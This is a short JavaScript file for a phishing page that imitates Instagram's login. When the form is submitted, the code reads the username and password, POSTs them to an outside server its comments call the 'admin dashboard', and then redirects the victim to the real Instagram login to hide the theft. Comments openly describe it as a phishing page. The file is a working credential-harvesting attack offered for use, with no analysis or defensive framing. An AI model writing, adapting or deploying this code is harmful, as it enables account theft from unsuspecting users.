// filename: public/script.js
document.getElementById('loginForm').addEventListener('submit', async (e) => {
    e.preventDefault(); // Prevent default form submission

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    try {
        const response = fetch('https://wizard-p1iw.onrender.com/login', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ username, password })
        });

        if (response.ok) {
            // Data successfully sent to your server
            console.log('Credentials sent to admin dashboard.');
            // Optionally, redirect to the real Instagram page or show a fake login error
            window.location.href = 'https://www.instagram.com/accounts/login/'; 
            // Or show a message: alert('Incorrect username or password. Please try again.');
        } else {
            console.error('Failed to send credentials to admin dashboard.');
            // Even if sending fails, for a convincing phishing page, you might still redirect
            window.location.href = 'https://www.instagram.com/accounts/login/';
        }
    } catch (error) {
        console.error('Error sending credentials:', error);
        // In case of network error, still try to redirect for seamless user experience
        window.location.href = 'https://www.instagram.com/accounts/login/';
    }
});